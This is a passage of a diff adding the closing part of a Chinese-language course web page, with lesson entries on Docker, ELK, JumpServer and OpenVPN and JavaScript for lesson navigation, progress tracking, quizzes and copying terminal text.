+  {id:'l7-4',ch:'CH7',title:'容器端口映射與文件傳遞',time:'15分鐘',type:'Docker 進階'},
+  {id:'l8-1',ch:'CH8',title:'ELK 介紹與架構',time:'15分鐘',type:'日誌系統'},
+  {id:'l8-2',ch:'CH8',title:'ELK 部署與 Kibana 視覺化',time:'20分鐘',type:'企業實戰'},
+  {id:'l9-1',ch:'CH9',title:'堡壘機概念與 JumpServer 安裝',time:'18分鐘',type:'安全管理'},
+  {id:'l9-2',ch:'CH9',title:'JumpServer 安全策略配置',time:'12分鐘',type:'安全配置'},
+  {id:'l10-1',ch:'CH10',title:'OpenVPN 原理與搭建實戰',time:'20分鐘',type:'網路安全'},
+];
+
+const done = new Set(JSON.parse(localStorage.getItem('stage2_done')||'[]'));
+let cur = 0;
+
+function goLesson(id, btn) {
+  document.querySelectorAll('.content-block').forEach(b=>b.classList.remove('active'));
+  document.querySelectorAll('.lesson-btn').forEach(b=>b.classList.remove('active'));
+  const block = document.getElementById(id);
+  if(block) block.classList.add('active');
+  if(btn) btn.classList.add('active');
+  cur = LESSONS.findIndex(l=>l.id===id);
+  updateUI();
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function toggleCh(btn, id) {
+  btn.classList.toggle('ch-open');
+  const list = document.getElementById(id);
+  if(list) list.classList.toggle('open');
+}
+
+function prevL() {
+  if(cur>0){ const l=LESSONS[cur-1]; findAndGo(l.id); }
+}
+function nextL() {
+  done.add(LESSONS[cur].id);
+  localStorage.setItem('stage2_done',JSON.stringify([...done]));
+  if(cur<LESSONS.length-1){ const l=LESSONS[cur+1]; findAndGo(l.id); }
+}
+function findAndGo(id) {
+  let targetBtn = null;
+  document.querySelectorAll('.lesson-btn').forEach(b=>{
+    if(b.getAttribute('onclick')&&b.getAttribute('onclick').includes("'"+id+"'")){
+      targetBtn = b;
+      // open parent chapter
+      let parent = b.parentElement;
+      if(parent && !parent.classList.contains('open')){
+        parent.classList.add('open');
+        const chBtn = parent.previousElementSibling;
+        if(chBtn) chBtn.classList.add('ch-open');
+      }
+    }
+  });
+  goLesson(id, targetBtn);
+}
+
+function updateUI(){
+  const l = LESSONS[cur];
+  if(!l) return;
+  document.getElementById('crumb').innerHTML = `STAGE 02 &gt; ${l.ch} &gt; <span>${l.title}</span>`;
+  document.getElementById('ltitle').textContent = l.title;
+  document.getElementById('ltag1').textContent = l.type;
+  document.getElementById('ltag2').textContent = `預計 ${l.time}`;
+  document.getElementById('counter').textContent = `${cur+1} / ${LESSONS.length}`;
+  document.getElementById('nav-ltitle').textContent = l.title;
+  document.getElementById('prev-btn').disabled = cur===0;
+  document.getElementById('next-btn').disabled = cur===LESSONS.length-1;
+  if(cur===LESSONS.length-1) document.getElementById('next-btn').textContent='階段完成';
+  else document.getElementById('next-btn').innerHTML='下一課 &#8594;';
+  const pct = Math.round(done.size/LESSONS.length*100);
+  document.getElementById('pct-label').textContent = pct+'%';
+  document.getElementById('prog-fill').style.width = pct+'%';
+}
+
+function checkQ(el, correct) {
+  const box = el.closest('.quiz');
+  if(box.dataset.answered) return;
+  box.dataset.answered = '1';
+  const opts = box.querySelectorAll('.quiz-opt');
+  opts.forEach(o=>o.style.pointerEvents='none');
+  if(correct){ el.classList.add('correct'); }
+  else {
+    el.classList.add('wrong');
+    opts.forEach(o=>{ if(o.getAttribute('onclick').includes('true')) o.classList.add('correct'); });
+  }
+  const exp = box.querySelector('.quiz-exp');
+  if(exp) exp.classList.add('show');
+}
+
+function copyTerm(btn) {
+  const body = btn.closest('.terminal').querySelector('.terminal-body');
+  const text = body.innerText;
+  navigator.clipboard.writeText(text).then(()=>{
+    btn.textContent='已複製';
+    setTimeout(()=>btn.textContent='複製',2000);
+  });
+}
+
+// init
+updateUI();
+done.forEach(id=>{
+  document.querySelectorAll('.lesson-btn').forEach(b=>{
+    if(b.getAttribute('onclick')&&b.getAttribute('onclick').includes("'"+id+"'")&&!b.classList.contains('active')){
+      b.classList.add('done');
+    }
+  });
+});
+</script>
+
+</body>
+</html>
